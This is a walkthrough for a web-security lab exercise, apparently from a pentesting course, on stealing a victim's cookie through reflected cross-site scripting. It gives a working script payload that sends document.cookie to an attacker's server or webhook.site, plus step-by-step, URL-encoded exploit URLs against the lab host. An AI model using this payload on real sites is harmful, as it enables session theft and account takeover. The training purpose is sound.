XSS 10

This exercise is identical to the first one. But this time, you're going to have to retrieve the victim's cookie. To do so, you can:

    Use your own server
    Use webhook.site

To get the cookie, you will use JavaScript. Your JavaScript code will retrieve the victim's cookies with document.cookie. 
Then you will add the value to a <img tag to send it to your website (or webhook.site).

Your payload should look like:

<script>
document.write('<img src="[URL]?c='+document.cookie+'" />');
</script>

Once the browser renders the JavaScript the <img tag should look like:

<img src="[URL]?c=[COOKIE]"/>

And it will send the cookies to your website.

Make sure you don't forget to encode the + in the URL (%2b).

 You can access this exercise using the following URL: http://ptl-ce335efb-4e5a926b.libcurl.st/. 

 Steps:
    1) Visit the given  URL: http://ptl-ce335efb-4e5a926b.libcurl.st/ and get the link to redirect: http://ptl-ce335efb-4e5a926b.libcurl.st/index.php?name=hacker
    2) Try to replace value of the "name" parameter with your XSS payload, and you will see it will be executed.
	3) Now, let's try to create out IMG tag here: <img src="https://myserver/?c=cookie">
	4) Now, let's try to combine this HTML element into our XSS payload: <script>document.write('<img src="https://myserver/?c='+document.cookie+'">');</script>
	5) Finally, let's put this into the value of "name" parameter in URL by replacing "+" with "%2B" (URL encoded value of "+" because browser sends + as space in GET request)!
	6) The final URL is: http://ptl-ce335efb-4e5a926b.libcurl.st/index.php?name=<script>document.write('<img src="https://myserver/?c='%2Bdocument.cookie%2B'">');</script>
	7) Here is the final URL that you can visit:
	 http://ptl-ce335efb-4e5a926b.libcurl.st/index.php?name=%3Cscript%3Edocument.write(%27%3Cimg%20src=%22https://myserver/?c=%27%2Bdocument.cookie%2B%27%22%3E%27);%3C/script%3E